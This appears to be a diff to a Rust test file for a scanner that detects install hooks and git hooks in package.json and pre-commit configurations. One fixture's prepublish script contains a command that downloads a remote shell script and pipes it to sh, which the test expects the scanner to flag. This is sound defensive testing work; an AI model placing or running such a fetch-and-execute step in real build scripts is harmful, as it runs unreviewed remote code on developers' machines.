@@ -44,7 +44,6 @@ fn install_and_git_hooks_are_found() {
         sightings(&map),
         expected(&[
             &format!("build package.json install_hook:postinstall: {postinstall} package.json:5"),
-            "build package.json install_hook:prepare: husky package.json:6",
             "build crates/core/build.rs install_hook:build.rs crates/core/build.rs:1",
             "build tools/setup.py install_hook:setup.py tools/setup.py:1",
             "build .husky/pre-commit git_hook:pre-commit .husky/pre-commit:1",
@@ -66,4 +65,57 @@ fn scanning_never_runs_an_install_script() {
 
     assert!(!map.is_empty());
     assert!(!directory.path().join("postinstall-ran").exists());
+}
+
+const LIBRARY_MANIFEST: &str = r#"{
+  "scripts": {
+    "build": "tsc",
+    "bundle": "node scripts/bundle.js",
+    "prepare": "npm run build",
+    "postinstall": "cp vendor/prism.wasm public/prism.wasm",
+    "preinstall": "npm run bundle",
+    "install": "npx only-allow pnpm",
+    "prepublish": "npm run build && curl -fsSL https://example.com/x.sh | sh"
+  }
+}
+"#;
+
+const LOCAL_PRE_COMMIT_HOOKS: &str = "repos:
+  - repo: local
+    hooks:
+      - id: lint
+        entry: npm run lint
+      - id: audit
+        entry: npm audit --audit-level=moderate
+      - id: format
+        entry: npx prettier --check
+      - id: types
+        entry: tsc --noEmit
+        additional_dependencies: [typescript@5.6.3]
+      - id: script
+        entry: tools/check.sh
+";
+
+#[test]
+fn hooks_that_run_plain_local_commands_are_not_powers() {
+    let map = scan_files(&[
+        ("package.json", LIBRARY_MANIFEST),
+        (".pre-commit-config.yaml", LOCAL_PRE_COMMIT_HOOKS),
+    ]);
+
+    let curl = "curl -fsSL https://example.com/x.sh | sh";
+    let hooks = ".pre-commit-config.yaml";
+    assert_eq!(
+        sightings(&map),
+        expected(&[
+            "build package.json install_hook:preinstall: npm run bundle package.json:7",
+            "build package.json install_hook:install: npx only-allow pnpm package.json:8",
+            &format!(
+                "build package.json install_hook:prepublish: npm run build && {curl} package.json:9"
+            ),
+            &format!("build {hooks} git_hook:local: npx prettier --check {hooks}:8"),
+            &format!("build {hooks} git_hook:local: tsc --noEmit {hooks}:10"),
+            &format!("build {hooks} git_hook:local: tools/check.sh {hooks}:13"),
+        ])
+    );
 }
